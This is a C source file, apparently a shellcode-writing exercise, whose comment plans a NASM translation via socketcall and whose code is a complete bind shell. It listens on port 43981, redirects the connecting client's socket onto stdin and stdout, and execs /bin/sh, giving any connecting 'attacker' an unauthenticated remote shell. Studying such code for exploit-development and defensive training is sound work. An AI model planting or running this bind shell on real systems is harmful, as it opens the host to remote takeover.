/*
this tutorial makes it all quite clear.
http://www.cs.rpi.edu/~moorthy/Courses/os98/Pgms/socket.html

for our purposes, we just need to perform the following function calls:
    socket / bind / listen / accept / dup2 / execve(shell)

things we don't need due to the execve spawning a shell; the shell will handle
processing data from the client (attacker):
-buffer to read in client data
-variables to handle reads/writes (clilen, n)
-client side sockaddr_in
-error handling to keep the assembly simple

in translating this C programming into NASM, we want to avoid linking
to external libraries. The resulting assembly will be much smaller (evidence?!)
if we can rely solely on system calls. As pointed out here
(http://www.tutorialspoint.com/unix_sockets/socket_server_example.htm)
we can use the socketcall(2) (0x66) system call to interface with all of the
socket functions in /usr/include/linux/net.h.

if we want to make it even smaller, we can remove the stderr reassignment
and rely solely on stdin and stdout. (try this...see how much smaller
it can be; w/ or w/out loop)

*/

#include <stdio.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>

int main(int argc, char *argv[])
{
    int srv_sockfd, clnt_sockfd;
    int srv_port = 43981; // set server port; 43981d = ABCDh
    struct sockaddr_in srv_addr;

    srv_sockfd = socket(AF_INET, SOCK_STREAM, 0);

    srv_addr.sin_family = AF_INET;
    srv_addr.sin_port = htons(srv_port);
    srv_addr.sin_addr.s_addr = INADDR_ANY;
    bind(srv_sockfd, (struct sockaddr *) &srv_addr, sizeof(srv_addr));

    // best practice: backlog (2nd arg) should be at least 5;
    // 4 is a good compromise because ebx is 4 at this point
    listen(srv_sockfd, 4);

    // addr and addrlen set to NULL b/c control will
    // handed over to the shell via dup2 and execve calls
    clnt_sockfd = accept(srv_sockfd, NULL, NULL);

    dup2(clnt_sockfd, 0);
    dup2(clnt_sockfd, 1);
    //dup2(clnt_sockfd, 2); // necessary?

    execve("/bin/sh", NULL, NULL);
    return 0;
}
